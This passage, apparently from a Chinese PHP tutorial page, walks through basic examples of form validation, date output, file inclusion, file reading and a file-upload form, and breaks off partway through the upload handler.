class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>菜鸟教程(runoob.com)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.error</span> <span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span> #FF0000<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 定义变量并默认设置为空值</span><span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token variable">$genderErr</span> <span class="token operator">=</span> <span class="token variable">$websiteErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token variable">$website</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"名字是必需的"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 检测名字是否只包含字母跟空格</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^[a-zA-Z ]*$/"</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许字母和空格"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"邮箱是必需的"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 检测邮箱是否合法</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/([\w\-]+\@[\w\-]+\.[\w\-]+)/"</span><span class="token punctuation">,</span><span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"非法邮箱格式"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"website"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$website</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$website</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"website"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 检测 URL 地址是否合法</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i"</span><span class="token punctuation">,</span><span class="token variable">$website</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$websiteErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"非法的 URL 的地址"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"comment"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"comment"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"gender"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$genderErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"性别是必需的"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"gender"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">test_input</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>PHP 表单验证实例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>* 必需字段。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PHP_SELF"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    名字: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>* <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$nameErr</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   E-mail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$email</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>* <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$emailErr</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   网址: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>website<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$website</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$websiteErr</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   备注: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>comment<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$comment</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   性别:   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$gender</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$gender</span><span class="token operator">==</span><span class="token string double-quoted-string">"female"</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"checked"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>女   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$gender</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$gender</span><span class="token operator">==</span><span class="token string double-quoted-string">"male"</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"checked"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>male<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>男   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>* <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$genderErr</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2&gt;您输入的内容是:&lt;/h2&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$email</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$website</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$comment</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$gender</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y/m/d"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y.m.d"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">;</span><span class="token comment">//或者</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//检测文件是否到达末尾</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//逐行读</span><span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//检测文件是否到达末尾</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//逐行读</span><span class="token punctuation">}</span><span class="token comment">//执行一些代码</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>菜鸟教程<span class="token punctuation">(</span>runoob<span class="token operator">.</span>com<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">"upload_file.php"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"post"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token operator">&gt;</span>文件名：<span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> id<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"提交"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"错误："</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传文件名: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> 